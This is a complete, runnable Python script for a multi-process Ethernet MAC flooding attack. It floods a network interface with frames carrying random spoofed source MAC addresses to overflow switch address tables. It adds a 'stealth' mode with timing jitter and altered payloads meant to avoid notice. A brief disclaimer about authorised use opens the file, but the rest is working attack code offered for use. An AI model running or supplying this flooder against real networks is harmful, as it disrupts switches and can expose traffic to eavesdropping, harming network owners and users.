#!/usr/bin/env python3
# -*- coding: UTF-8 -*-


"""
WiFi cards are not compatible with this MAC flooder tool only Ethernet interfaces are.
Only use this tool on routers that you own or have been specifically given permission to test Unauthorized use is unethical and against the law..
MAC table overflow attacks from this tool may only affect a small number of outdated or improperly configured switches or routers that do not limit MAC addresses.

"""

import argparse
import secrets
import multiprocessing
import time
import socket
import sys
import os
import binascii
import re

MIN_ETH_PAYLOAD = 46
MAX_ETH_PAYLOAD = 1450

ethertypeMap = {
    "ipv4": 0x0800,
    "arp": 0x0806,
    "ipv6": 0x86DD,
    "vlan": 0x8100,
    "mpls_uc": 0x8847,
    "mpls_mc": 0x8848,
    "flowctrl": 0x8808, 
    "lacp": 0x8809,
    "lldp": 0x88CC,
    "macsec": 0x88E5,
    "ptp": 0x88F7,
    "qinq": 0x88A8,
    "experimental": 0x88B5,
}

def parseEthertype(val):
    valLower = val.lower()
    if valLower == "auto":
        return "auto"
    if valLower in ethertypeMap:
        return ethertypeMap[valLower]
    try:
        return int(val, 0)
    except Exception:
        raise argparse.ArgumentTypeError(
            f"Invalid EtherType '{val}'. Use a hex value (e.g., 0x0800), 'auto', or one of: {', '.join(ethertypeMap.keys())}"
        )

def randomMac(stealth=False):
    if stealth:
        first = secrets.randbelow(256) | 0x02
        first = first & 0xFE
        mac = [first] + [secrets.randbelow(256) for _ in range(5)]
    else:
        mac = [secrets.randbelow(256) for _ in range(6)]
    return ':'.join(f'{b:02x}' for b in mac)

def macToBytes(mac: str) -> bytes:
    return binascii.unhexlify(mac.replace(':', ''))

def buildEthernetFrame(dstMac: str, srcMac: str, etherType: int, payload: bytes) -> bytes:
    ethTypeBytes = etherType.to_bytes(2, byteorder='big')
    return macToBytes(dstMac) + macToBytes(srcMac) + ethTypeBytes + payload

def validateHexString(hexStr):
    cleaned = hexStr.strip().replace(":", " ").upper()
    parts = cleaned.split()
    if not parts:
        raise ValueError("Hex string is empty.")
    for part in parts:
        if not re.fullmatch(r"[0-9A-F]{2}", part):
            raise ValueError(f"Invalid hex byte: '{part}'. Each byte must be exactly two hex digits (e.g., 'AA', '0F').")
    return ''.join(parts)

def craftPayload(size, mode, customHex=None, customAscii=None, counter=0, stealth=False):
    if mode == "random":
        if stealth:
            return bytes(secrets.randbelow(3) for _ in range(size))  # ternary for stealth
        else:
            return bytes(secrets.randbelow(256) for _ in range(size))
    elif mode == "zero":
        return b'\x00' * size
    elif mode == "ff":
        return b'\xff' * size
    elif mode == "inc":
        if stealth:
            return bytes([(counter + i) % 3 for i in range(size)])  # ternary for stealth
        else:
            return bytes([(counter + i) % 256 for i in range(size)])
    elif mode == "custom":
        if customHex:
            cleaned = validateHexString(customHex)
            raw = binascii.unhexlify(cleaned)
            if stealth:
                ternary = bytes(b % 3 for b in raw)
                return (ternary * (size // len(ternary) + 1))[:size]
            else:
                return (raw * (size // len(raw) + 1))[:size]
        elif customAscii:
            patBytes = customAscii.encode()
            if stealth:
                ternary = bytes(b % 3 for b in patBytes)
                return (ternary * (size // len(ternary) + 1))[:size]
            else:
                return (patBytes * (size // len(patBytes) + 1))[:size]
        else:
            raise ValueError("With --payload-mode custom, you must provide --custom-hex or --custom-ascii.")
    elif mode == "counter":
        if stealth:
            prefix = bytes([(counter >> (8 * i)) % 3 for i in reversed(range(4))])
            rest = bytes(secrets.randbelow(3) for _ in range(size - 4)) if size > 4 else b''
        else:
            prefix = counter.to_bytes(4, 'big')
            rest = bytes(secrets.randbelow(256) for _ in range(size - 4)) if size > 4 else b''
        return (prefix + rest)[:size]
    else:
        if stealth:
            return bytes(secrets.randbelow(3) for _ in range(size))
        else:
            return bytes(secrets.randbelow(256) for _ in range(size))
def macFloodWorker(interface, dstMac, payloadSize, packetCount, interval, etherType, payloadMode, customHex, customAscii, autoSize, resultQueue, stealth):
    try:
        sock = socket.socket(socket.AF_PACKET, socket.SOCK_RAW)
        sock.bind((interface, 0))
    except Exception as e:
        print(f"Error opening interface {interface}: {e}")
        sys.exit(1)
    sentPackets = 0
    counter = 0
    ethertypeList = list(ethertypeMap.values())
    prebuiltPayload = None
    if not (payloadMode in ["inc", "counter"] or autoSize or etherType == "auto" or stealth):
        prebuiltPayload = craftPayload(payloadSize, payloadMode, customHex, customAscii, counter, stealth=stealth)
    try:
        while packetCount == 0 or sentPackets < packetCount:
            srcMac = randomMac(stealth=stealth)
            if autoSize:
                size = secrets.randbelow(MAX_ETH_PAYLOAD - MIN_ETH_PAYLOAD + 1) + MIN_ETH_PAYLOAD
            else:
                size = payloadSize
            if prebuiltPayload and len(prebuiltPayload) == size:
                payload = prebuiltPayload
            else:
                payload = craftPayload(size, payloadMode, customHex, customAscii, counter, stealth=stealth)
            if etherType == "auto":
                chosenEtherType = secrets.choice(ethertypeList)
            else:
                chosenEtherType = etherType
            ethFrame = buildEthernetFrame(dstMac, srcMac, chosenEtherType, payload)
            try:
                sock.send(ethFrame)
                sentPackets += 1
                counter += 1
                if interval > 0:
                    time.sleep(interval + secrets.randbelow(10)/1000.0)
            except Exception as e:
                print(f"Send error: {e}", file=sys.stderr)
    except KeyboardInterrupt:
        pass
    finally:
        resultQueue.put(sentPackets)
        sock.close()

def macFlood(interface, dstMac, size, count, processes, interval, etherType, payloadMode, customHex, customAscii, autoSize, stealth):
    print(f"Starting MAC flood on interface {interface} with {processes} processes. EtherType: {etherType if etherType == 'auto' else f'0x{etherType:04x}'}")
    processesList = []
    resultQueue = multiprocessing.Queue()
    for _ in range(processes):
        p = multiprocessing.Process(
            target=macFloodWorker,
            args=(interface, dstMac, size, count, interval, etherType, payloadMode, customHex, customAscii, autoSize, resultQueue, stealth)
        )
        p.start()
        processesList.append(p)
    try:
        while any(p.is_alive() for p in processesList):
            time.sleep(1)
            print(f"\rFlooding in progress... (Press Ctrl+C to stop)", end='', flush=True)
    except KeyboardInterrupt:
        print("\nStopping MAC flood...")
    for p in processesList:
        p.terminate()
        p.join()
    totalSent = 0
    while not resultQueue.empty():
        totalSent += resultQueue.get()
    print(f"\nTotal packets sent: {totalSent}")

def main():
    parser = argparse.ArgumentParser(
        prog="mac_injection.py",
        description=(
            "MAC Flooder Tool\n"
            "Send many Ethernet frames with random or fake MAC addresses.\n\n"
            "Examples:\n"
            "  sudo python3 mac_injection.py -i eth0\n"
            "  sudo python3 mac_injection.py  -s auto -c 1000 -i eth0 -t 8  -s auto --payload-mode ff --ether-type arp\n"
            
        ),
        formatter_class=argparse.RawTextHelpFormatter
    )
    parser.add_argument(
        "-i", "--interface", required=True,
        metavar="INTERFACE",
        help="Network interface to use (e.g., eth0)"
    )
    parser.add_argument(
        "-d", "--dstmac", default="ff:ff:ff:ff:ff:ff",
        metavar="DSTMAC",
        help="Destination MAC address (default: broadcast)"
    )
    parser.add_argument(
        "-s", "--size", default="46",
        metavar="SIZE",
        help="Payload size in bytes (minimum 46, maximum 1450), or 'auto' for random size"
    )
    parser.add_argument(
        "-c", "--count", type=int, default=0,
        metavar="COUNT",
        help="Number of frames per process (0 = unlimited)"
    )
    parser.add_argument(
        "-t", "--threads", type=int, default=4,
        metavar="THREADS",
        help="Number of parallel processes to use"
    )
    parser.add_argument(
        "-v", "--interval", type=float, default=0,
        metavar="INTERVAL",
        help="Delay between frames in seconds (default: 0)"
    )
    parser.add_argument(
        "--ether-type", type=parseEthertype, default=0x88B5,
        metavar="ETHER_TYPE",
        help=(
            "EtherType value (e.g., ipv4, arp, vlan, or can be hex format, "
            "or 'auto' for random)"
        )
    )
    parser.add_argument(
        "--payload-mode",
        choices=["random", "zero", "ff", "inc", "custom", "counter"],
        default="random",
        metavar="MODE",
        help=(
            "Payload pattern:\n"
            "  random  - random bytes\n"
            "  zero    - all zeros\n"
            "  ff      - all 0xFF\n"
            "  inc     - incrementing values\n"
            "  custom  - use custom hex or ascii\n"
            "  counter - counter in payload"
        )
    )
    parser.add_argument(
        "--custom-hex",
        metavar="CUSTOM_HEX",
        help="Custom payload as hex string (e.g., 'AA DD' or 'AA:DD'). Use with --payload-mode custom"
    )
    parser.add_argument(
        "--custom-ascii",
        metavar="CUSTOM_ASCII",
        help="Custom payload as ASCII string. Use with --payload-mode custom"
    )
    parser.add_argument(
        "--stealth", action="store_true",
        help="Enable stealth mode (jitter, and ternary payloads)"
    )
    args = parser.parse_args()
    # ... rest of your code ...
    if args.custom_hex and args.custom_ascii:
        print("Error: --custom-hex and --custom-ascii cannot be used together.")
        sys.exit(1)
    autoSize = False
    if args.size == "auto":
        autoSize = True
        size = MIN_ETH_PAYLOAD
    else:
        try:
            size = int(args.size)
        except ValueError:
            print("Invalid size. Use an integer or 'auto'.")
            sys.exit(1)
        if size < MIN_ETH_PAYLOAD or size > MAX_ETH_PAYLOAD:
            print(f"Ethernet payload must be between {MIN_ETH_PAYLOAD} and {MAX_ETH_PAYLOAD} bytes.")
            sys.exit(1)
    if args.payload_mode == "custom":
        if not args.custom_hex and not args.custom_ascii:
            print("You must provide --custom-hex or --custom-ascii when using --payload-mode custom.")
            sys.exit(1)
        if args.custom_hex:
            try:
                validateHexString(args.custom_hex)
            except Exception as e:
                print(f"Invalid --custom-hex: {e}")
                sys.exit(1)
    else:
        if args.custom_hex or args.custom_ascii:
            print("--custom-hex and --custom-ascii can only be used with --payload-mode custom.")
            sys.exit(1)
    macFlood(
        interface=args.interface,
        dstMac=args.dstmac,
        size=size,
        count=args.count,
        processes=args.threads,
        interval=args.interval,
        etherType=args.ether_type,
        payloadMode=args.payload_mode,
        customHex=args.custom_hex,
        customAscii=args.custom_ascii,
        autoSize=autoSize,
        stealth=args.stealth
    )

if __name__ == "__main__":
    main()